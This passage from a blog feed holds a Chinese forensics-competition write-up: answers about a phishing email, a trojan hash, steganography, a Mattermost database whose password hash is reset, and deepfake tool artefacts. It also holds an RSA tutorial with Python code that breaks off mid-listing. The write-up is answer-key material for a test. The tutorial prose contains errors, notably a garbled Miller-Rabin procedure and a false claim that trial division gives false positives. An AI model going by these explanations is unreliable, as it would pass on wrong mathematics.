alt="言_pc_3_3.png"></p><p>6.分析义言的计算机检材，计算机曾接收到一封钓鱼邮件，该邮件发件人是：[答案格式：<a href="mailto:&#x61;&#x62;&#99;&#x40;&#97;&#x62;&#x63;&#x2e;&#x61;&#98;&#99;">&#x61;&#x62;&#99;&#x40;&#97;&#x62;&#x63;&#x2e;&#x61;&#98;&#99;</a>] [★★☆☆☆]</p><p><strong><a href="mailto:&#56;&#x33;&#x38;&#x32;&#x39;&#57;&#x31;&#55;&#54;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;">&#56;&#x33;&#x38;&#x32;&#x39;&#57;&#x31;&#55;&#54;&#64;&#113;&#113;&#46;&#99;&#x6f;&#109;</a></strong></p><p><img src="/../img/%E8%A8%80_pc_4.png" alt="言_pc_4.png"></p><p>7.接上题，钓鱼邮件中附件的大小是多少MB：[答案格式：12.3] [★★☆☆☆]</p><p><strong>2.4</strong></p><p><img src="/../img/%E8%A8%80_pc_5.png" alt="言_pc_5.png"></p><p>8.接上题，上述附件解压运行后，文件的释放位置是：[答案格式：D:\Download\test] [★★☆☆☆]</p><p><strong>C:\Windows\Temp</strong></p><p><img src="/../img/%E8%A8%80_pc_7.png" alt="言_pc_7.png"></p><p>9.接上题，恶意木马文件的MD5 值是：[答案格式：小写] [★★☆☆☆]</p><p><strong>1877379d9e611ea52befbbe2c2c77c55</strong></p><p><img src="/../img/%E8%A8%80_pc_8.png" alt="言_pc_8.png"></p><p>10.接上题，恶意木马文件的回连IP地址是：[答案格式：127.0.0.1] [★★☆☆☆]</p><p>11.分析义言的计算机检材，计算机中保存的有隐写痕迹的文件名：[答案格式：abc.abc] [★★★☆☆]</p><p><strong>a78bd8b5bec5f60380782bd674c7443p.bmp</strong></p><p>解密加密分区后，回收站会发现多出来一个<code>LSB_hide</code></p><p>搜索后发现是一个bmp图片隐藏工具</p><p><img src="/../img/%E8%A8%80_pc_9_1.png" alt="言_pc_9_1.png"></p><p>搜索bmp</p><p><img src="/../img/%E8%A8%80_pc_9_2.png" alt="言_pc_9_2.png"></p><p>12.分析义言的计算机检材，保存容器密码的文件大小是多少字节：[答案格式：123] [★★★☆☆]</p><p><strong>20</strong></p><p>解密分区后，找到vc加密容器</p><p>使用<code>Extract</code>内的密码，可以成功挂载vc容器</p><p><img src="/../img/%E8%A8%80_pc_10.png" alt="言_pc_10.png"></p><p>查看Extract大小</p><p><img src="/../img/%E8%A8%80_pc_10_2.png" alt="言_pc_10_2.png"></p><p>13.分析义言的计算机内存检材，该内存镜像制作时间(UTC+8)是：[答案格式：2024-01-01-04-05] [★★☆☆☆]</p><p>14.分析义言的计算机内存检材，navicat.exe的进程ID是：[答案格式：123] [★★☆☆☆]</p><h2 id="服务器部分"><a href="#服务器部分" class="headerlink" title="服务器部分"></a>服务器部分</h2><h3 id="IM服务器"><a href="#IM服务器" class="headerlink" title="IM服务器"></a>IM服务器</h3><p>1.分析内部IM服务器检材，在搭建的内部即时通讯平台中，客户端与服务器的通讯端口是：[答案格式：8888] [★☆☆☆☆]</p><p><strong>8065</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker ps<br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_1.png" alt="服务器_1.png"></p><p>2.分析内部IM服务器检材，该内部IM平台使用的数据库版本是：[答案格式：12.34] [★★☆☆☆]</p><p><strong>12.18</strong></p><p>查看docker环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker inspect 64 | grep -i <span class="hljs-string">&#x27;env&#x27;</span> -C 10<br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_2_1.png" alt="服务器_2_1.png"></p><p>同时在这里得到了服务器主机ip：172.17.0.1和本地分配的ip：192.169.80.130</p><p>在前面可以知道主机的用户名：root，密码：123456（原来为root，仿真后自动修改了）</p><p>以及数据库的用户名：mmuser，密码：mostest</p><p>可以使用navicat通过ssh远程连接</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_2_2.png" alt="服务器_2_2.png"></p><p>连接成功进入数据库</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_2_3.png" alt="服务器_2_3.png"></p><p>3.分析内部IM服务器检材，该内部IM平台中数据库的名称是：[答案格式：小写] [★★☆☆☆]</p><p><strong>mattermost_test</strong></p><p>见第二题图</p><p>4.分析内部IM服务器检材，该内部IM平台中当前数据库一共有多少张表：[答案格式：1] [★★☆☆☆]</p><p><strong>82</strong></p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_3_1.png" alt="服务器_3_1.png"></p><p>进入数据库后，查看user表，发现密码是bcrypt加密</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_3_3.png" alt="服务器_3_3.png"></p><p>修改为123456</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_3_2.png" alt="服务器_3_2.png"></p><p>5.分析内部IM服务器检材，员工注册的邀请链接中，邀请码是：[答案格式：小写数字字母] [★★★☆☆]</p><p><strong>54d916mu6p858bbyz8f88rmbmc</strong></p><p>登录gxyt账户(管理员)可以看到</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_4.png" alt="服务器_4.png"></p><p>6.分析内部IM服务器检材，用户yiyan一共给fujiya发送了几个视频文件：[答案格式：数字] [★★★☆☆]</p><p><strong>2</strong></p><p>登录yiyan的账户可以看到</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_5.png" alt="服务器_5.png"></p><p>7.分析内部IM服务器检材，用户yiyan在团队群组中发送的视频文件的MD5值是：[答案格式：小写] [★★★☆☆]</p><p><strong>f8adb03a25be0be1ce39955afc3937f7</strong></p><p>下载查询</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_6_1.png" alt="服务器_6_1.png"></p><p>cmd命令</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_6_2.png" alt="服务器_6_2.png"></p><p>8.分析内部IM服务器检材，一个团队中允许的最大用户数是：[答案格式：数字] [★★★★☆]</p><p><strong>50</strong></p><p>登录gxyt的账号，在系统控制台可以看到</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_7.png" alt="服务器_7.png"></p><p>9.分析内部IM服务器检材，黑客是什么时候开始攻击：[答案格式：2024-01-01-04-05] [★★★☆☆]</p><p><strong>2024-04-25-15-33</strong></p><p>2024-04-25 07:33:20.003 Z</p><p>Z:表示UTC时间，转换为北京时间要加8小时</p><p>查看服务器日志可以看到黑客对服务器密码进行爆破</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_8.png" alt="服务器_8.png"></p><h3 id="网站服务器"><a href="#网站服务器" class="headerlink" title="网站服务器"></a>网站服务器</h3><p>1.分析网站服务器检材，网站搭建使用的服务器管理软件当前版本是否支持32位系统：[答案格式：是&#x2F;否] [★☆☆☆☆]</p><p><strong>否</strong></p><p>分析检材发现宝塔</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_9_1.png" alt="服务器_9_1.png"></p><p>仿真登录，按照宝塔面板的常规操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bt 5 <span class="hljs-comment"># 修改密码</span><br>bt 14 <span class="hljs-comment"># 显示默认信息</span><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_9_2.png" alt="服务器_9_2.png"></p><p>浏览器访问，发现是宝塔开心版</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_9_3.png" alt="服务器_9_3.png"></p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_9_4.png" alt="服务器_9_4.png"></p><p>2.分析网站服务器检材，数据库备份的频率是一周多少次：[答案格式：1] [★★☆☆☆]</p><p><strong>1</strong></p><p>在Linux系统中，<code>crontab</code> 是一个用于设置周期性被执行的任务的命令。<code>crontab -l</code> 命令用于列出当前用户所有的 crontab 文件中的任务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_10.png" alt="服务器_10.png"></p><p><code>0 0 * * 0 /root/backup.sh</code>表示每个星期日的00:00:00执行一次，所以每周一次</p><p>3.分析网站服务器检材，数据库备份生成的文件的密码是：[答案格式：admin] [★★☆☆☆]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">IvPGP/8vfTLtzQfJTmQhYg==<br></code></pre></td></tr></table></figure><p>备份文件为DES3加密，密码为$AES_PASS的值，是使用OpenSSL生成一个的AES-256加密的值</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_11_1.png" alt="服务器_11_1.png"></p><p>使用OpenSSL再生成一次密码即可</p><p><img src="/../img/%E6%9C%8D%E5%8A%A1%E5%99%A8_11_2.png" alt="服务器_11_2.png"></p><p>4.分析网站服务器检材，网站前台首页的网站标题是：[答案格式：百度] [★★★☆☆]</p><p>5.分析网站服务器检材，受害人第一次成功登录网站的时间是：[答案格式：2024-01-01-04-05] [★★★☆☆]</p><p>6.分析网站服务器检材，前台页面中，港澳数字竞猜游戏中，进入贵宾厅最低点数是：[答案格式：1234] [★★★☆☆]</p><p>7.分析网站服务器检材，受害人在平台一共盈利了多少钱：[答案格式：12] [★★☆☆☆]</p><p>8.分析网站服务器检材，网站根目录下，哪个路径存在漏洞：[答案格式：&#x2F;Admin&#x2F;User&#x2F;register.php] [★★★☆☆]</p><p>9.分析网站服务器检材，黑客通过哪个文件上传的木马文件：[答案格式：test.php] [★☆☆☆☆]</p><p>10.分析网站服务器检材，木马文件的密码是：[答案格式：123] [★☆☆☆☆]</p><h2 id="人工智能部分"><a href="#人工智能部分" class="headerlink" title="人工智能部分"></a>人工智能部分</h2><p>1.分析义言的计算机检材，一共训练了多少个声音模型：[答案格式：123] [★★☆☆☆]</p><p><strong>4</strong></p><p>GPT-SoVITS-beta0217是AI语音合成项目</p><p>训练的模型会留下日志，所以总共训练了4个</p><p><img src="/../img/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD_1.png" alt="人工智能_1.png"></p><p>2.分析义言的计算机检材，声音模型voice2，一共训练了多少条声音素材：[答案格式：123] [★★☆☆☆]</p><p><strong>17</strong></p><p><img src="/../img/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD_2.png" alt="人工智能_2.png"></p><p>3.分析义言的计算机检材，声音模型voice3，一共训练了多少轮：[答案格式：123] [★★★☆☆]</p><p><strong>8</strong></p><p><img src="/../img/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD_3.png" alt="人工智能_3.png"></p><p>4.分析义言的计算机检材，声音克隆工具推理生成语音界面的监听端口是：[答案格式：1234] [★★★★☆]</p><p><strong>9874</strong></p><p>执行go-webui.bat启动项目</p><p><img src="/../img/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD_4_1.png" alt="人工智能_4_1.png"></p><p>运行在9874端口</p><p><img src="/../img/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD_4_2.png" alt="人工智能_4_2.png"></p><p>5.分析义言的计算机检材，电脑中视频文件有几个被换过脸：[答案格式:10] [★★★★★]</p><p>6.分析义言的计算机检材，换脸AI程序默认换脸视频文件名是：[答案格式：test.mp4] [★★☆☆☆]</p><p><strong>target-1080p.mp4</strong></p><p>该软件的默认视频文件夹是<code>videos</code></p><p><img src="/../img/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD_6.png" alt="人工智能_6.png"></p><p>7.分析义言的计算机检材，换脸AI程序默认换脸图片的文件名称：[答案格式：abc.abc] [★★☆☆☆]</p><p><strong>fc3d6cb14c0d4e52adcf8717f2740b5c.jpeg</strong></p><p>换脸图片文件在faces目录</p><p><img src="/../img/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD_7.png" alt="人工智能_7.png"></p><p>8.分析义言的计算机检材，换脸AI程序模型文件数量是多少个：[答案格式：10] [★★☆☆☆]</p><p><strong>15</strong></p><p><img src="/../img/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD_8.png" alt="人工智能_8.png"></p>]]></content>
      
      
      <categories>
          
          <category> Forensic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 盘古石杯 </tag>
            
            <tag> Forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2024/05/04/RSA/"/>
      <url>/2024/05/04/RSA/</url>
      
        <content type="html"><![CDATA[<h1 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h1><p><strong>保密</strong> + <strong>认证</strong></p><p><img src="/../img/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6.png"></p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>RSA算法是一种非对称加密算法，由Ron Rivest、Adi Shamir和Leonard Adleman于1977年发明，并以他们的姓氏首字母命名。RSA算法基于大数分解的难题，即分解两个大素数乘积的难度，这是RSA算法的安全基础。</p><h2 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤"></a>主要步骤</h2><h3 id="1-密钥生成"><a href="#1-密钥生成" class="headerlink" title="1.密钥生成"></a><strong>1.密钥生成</strong></h3><ul><li>选择两个大质数p和q。</li><li>计算n &#x3D; p * q，n是加密密钥。</li><li>计算欧拉函数φ(n) &#x3D; (p-1) * (q-1)。</li><li>选择一个小于φ(n)的整数e，使得e和φ(n)互质（即它们的最大公约数为1）。</li><li>计算d，使得e * d ≡ 1 (mod φ(n))。d是解密密钥。</li></ul><h3 id="2-密钥分发"><a href="#2-密钥分发" class="headerlink" title="2.密钥分发"></a><strong>2.密钥分发</strong></h3><ul><li>公开n和e，作为公钥。</li><li>保密d，作为私钥。</li></ul><h3 id="3-加密"><a href="#3-加密" class="headerlink" title="3.加密"></a><strong>3.加密</strong></h3><ul><li>使用公钥（n和e）进行加密。</li><li>选择明文消息m（0 &lt; m &lt; n）。</li><li>计算密文c &#x3D; m^e (mod n)。</li></ul><h3 id="4-解密"><a href="#4-解密" class="headerlink" title="4.解密"></a><strong>4.解密</strong></h3><ul><li>使用私钥（n和d）进行解密。</li><li>计算明文m &#x3D; c^d (mod n)。</li></ul><h2 id="素性检验"><a href="#素性检验" class="headerlink" title="素性检验"></a>素性检验</h2><h3 id="试除法"><a href="#试除法" class="headerlink" title="试除法"></a>试除法</h3><p>（Trial Division）是一种简单但效率较低的素数检验方法。它通过尝试将给定的数n除以所有小于等于n的质数来判断n是否为素数。如果n可以被任何一个这样的质数整除，那么n就不是素数。如果n不能被任何一个这样的质数整除，那么n可能是素数。<br>试除法的步骤如下：</p><ol><li>选择一个质数p，p可以是从2开始的任意质数。</li><li>计算n除以p的余数r。</li><li>如果r等于0，则n不是素数。</li><li>如果r不等于0，选择下一个质数p+1，重复步骤2和3。</li><li>如果对所有小于等于√n的质数p，n都不能被整除，那么n可能是素数。</li></ol><p>这种方法的时间复杂度是O(n^1&#x2F;2)，因为它需要尝试所有小于等于√n的质数。因此，对于非常大的数，试除法非常慢。此外，试除法对于某些合数可能会产生假阳性，即错误地判断合数为素数。<br>在实际应用中，试除法通常用于较小的数或者作为其他更高效素性检验方法的辅助。对于较大的数，通常会使用米勒-拉宾素性检验等更高效的概率性方法。</p><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_prime</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-comment"># 检查n是否为合数</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">int</span>(n**<span class="hljs-number">0.5</span>) + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">if</span> n % i == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>在这个例子中，<code>is_prime</code>函数用于执行试除法。它首先检查n是否小于等于1，如果是，则返回False。然后，它检查n是否小于等于3，如果是，则返回True。接下来，它检查n是否可以被2整除，如果是，则返回False。最后，它通过循环检查n是否可以被所有小于等于n的奇数整除。如果n不能被任何一个这样的数整除，那么它可能是素数。</p><h3 id="米勒-拉宾素性检验"><a href="#米勒-拉宾素性检验" class="headerlink" title="米勒-拉宾素性检验"></a>米勒-拉宾素性检验</h3><p>（Miller-Rabin Primality Test）是一种概率性素性检验算法，用于判断一个数是否为素数。该算法基于一个称为费马小定理的数学原理，并经过优化，使其具有较高的效率和较低的错误率。<br>米勒-拉宾素性检验的基本步骤如下：</p><ol><li>选择一个随机数a，a是2到n-2之间的整数。</li><li>计算r &#x3D; n - 1，然后找到r的欧几里得算法除数d，满足d * 2^r ≡ 1 (mod n)。</li><li>计算x &#x3D; a^d (mod n)。</li><li>如果x &#x3D; 1或x &#x3D; n-1，则n可能是素数。</li><li>对于k &#x3D; 0到s-1，执行以下步骤：<ul><li>将r除以2，得到r_i &#x3D; r &#x2F; 2^i。</li><li>计算x &#x3D; x^2 (mod n)。</li><li>如果x &#x3D; 1，则n是合数。</li><li>如果x &#x3D; n-1，则继续下一次迭代。</li><li>如果x^r_i ≡ -1 (mod n)，则n是合数。</li></ul></li><li>如果所有迭代都没有发现n是合数，则n是素数。<br> 其中，s是测试的迭代次数，s越大，错误率越低。</li></ol><h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">miller_rabin_primality_check</span>(<span class="hljs-params">n, k=<span class="hljs-number">20</span></span>):<br>   <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">   米勒-拉宾素性检验</span><br><span class="hljs-string">   由于假设n是一个素数，n-1=a^s*d,s和d是常量，改变a的值，检测20次</span><br><span class="hljs-string">   :param n:</span><br><span class="hljs-string">   :param k:</span><br><span class="hljs-string">   :return:</span><br><span class="hljs-string">   &quot;&quot;&quot;</span><br>   <span class="hljs-keyword">assert</span> n &gt; <span class="hljs-number">3</span><br>   <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>   <span class="hljs-comment"># 找出n-1 = 2^s*d</span><br>   s, d = <span class="hljs-number">0</span>, n - <span class="hljs-number">1</span><br>   <span class="hljs-keyword">while</span> d % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>       d &gt;&gt;= <span class="hljs-number">1</span><br>       s += <span class="hljs-number">1</span><br><br>   <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k):<br>       a = randrange(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>       x = <span class="hljs-built_in">pow</span>(a, d, n)<br><br>       <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> x == n - <span class="hljs-number">1</span>:<br>           <span class="hljs-keyword">continue</span><br><br>       <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s):<br>           x = <span class="hljs-built_in">pow</span>(x, <span class="hljs-number">2</span>, n)<br>           <span class="hljs-keyword">if</span> x == n - <span class="hljs-number">1</span>:<br>               <span class="hljs-keyword">break</span><br>       <span class="hljs-keyword">else</span>:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>在这个例子中，<code>miller_rabin</code>函数用于执行米勒-拉宾素性检验。我们选择了一个随机数a，并进行了s次迭代。如果n通过了所有迭代，则我们认为是素数。如果n没有通过所有迭代，我们仍然不能确定它是合数，因为我们使用的是概率性测试。</p><h2 id="快速模幂算法"><a href="#快速模幂算法" class="headerlink" title="快速模幂算法"></a>快速模幂算法</h2><p>（Fast Modular Exponentiation）是一种用于计算大数模幂运算的算法，其时间复杂度为O(log n)，其中n是指数的大小。这种算法特别适用于RSA加密算法中的密钥生成和加密过程。</p><p>快速模幂算法的基本思想是将指数n分解为二进制形式，并利用模运算的性质来简化计算。</p><p>具体步骤如下：</p><ol><li><strong>初始化</strong>：<ul><li>设置结果 <code>result = 1</code>。</li><li>设置底数 <code>base = base</code>。</li><li>设置模数 <code>modulus = modulus</code>。</li></ul></li><li><strong>二进制分解</strong>：<ul><li>将指数n转换为二进制形式，并计算其长度 <code>bit_length = len(bin(n)) - 2</code>。</li></ul></li><li><strong>循环计算</strong>：<ul><li>循环 <code>i = 0</code> 到 <code>bit_length - 1</code>。</li><li>在每次迭代中，将 <code>result</code> 乘以 <code>result</code>（即 <code>result = result * result mod modulus</code>）。</li><li>如果 <code>n &amp; (1 &lt;&lt; i)</code> 等于1（即二进制位的值为1），则将 <code>base</code> 乘以 <code>result</code>（即 <code>result = base * result mod modulus</code>）。</li></ul></li><li><strong>返回结果</strong>：<ul><li>循环结束后，<code>result</code> 将是 <code>base^n mod modulus</code> 的结果。<br>快速模幂算法的一个关键优化是<strong>使用模平方来减少乘法运算</strong>。这样可以避免在每次迭代中都需要进行乘法运算，从而显著提高算法的效率。</li></ul></li></ol><h5 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fast_mod_pow</span>(<span class="hljs-params">base, exponent, modulus</span>):<br>    result = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> exponent &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> exponent &amp; <span class="hljs-number">1</span>:<br>            result = (result * base) % modulus<br>        base = (base * base) % modulus<br>        exponent &gt;&gt;= <span class="hljs-number">1</span>  <span class="hljs-comment"># 右移一位，相当于除以2</span><br>    <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>fast_mod_pow</code>函数用于计算 <code>base^exponent mod modulus</code>。我们首先将指数转换为二进制形式，然后使用循环和模平方来计算结果。最后，我们打印出计算结果。</p><h2 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h2><p>扩展欧几里得算法（Extended Euclidean Algorithm）是欧几里得算法的一个变体，它不仅找到两个整数a和b的最大公约数gcd(a, b)，还找到一组整数x和y，使得等式ax + by &#x3D; gcd(a, b)成立。这组整数x和y被称为扩展欧几里得算法的解。<br>扩展欧几里得算法的基本步骤如下：</p><ol><li>如果a等于0，那么gcd(a, b)就是b，x是0，y是1。</li><li>如果b等于0，那么gcd(a, b)就是a，x是1，y是0。</li><li>否则，计算gcd(b, a % b)，并设x1、y1为x和y的值。</li><li>设置新的a为原来的b，新的b为x1，新的x为y1，新的y为x - (a &#x2F;&#x2F; b) * y1。</li><li>重复步骤3和4，直到b为0。</li></ol><p>扩展欧几里得算法的时间复杂度是O(log(min(a, b)))，因为每一步都减半了b的大小。</p><h5 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">extended_euclidean</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        gcd, x1, y1 = extended_euclidean(b % a, a)<br>        x = y1 - (b // a) * x1<br>        y = x1<br>        <span class="hljs-keyword">return</span> gcd, x, y<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>extended_euclidean</code>函数用于计算 <code>gcd(a, b)</code> 以及满足等式 <code>ax + by = gcd(a, b)</code> 的整数x和y。我们首先检查a是否等于0，如果是，则返回b和相应的x、y值。否则，我们递归地调用扩展欧几里得算法，直到b为0。最后，我们打印出gcd、x和y的值。</p><h1 id="RSA代码实现"><a href="#RSA代码实现" class="headerlink" title="RSA代码实现"></a>RSA代码实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span 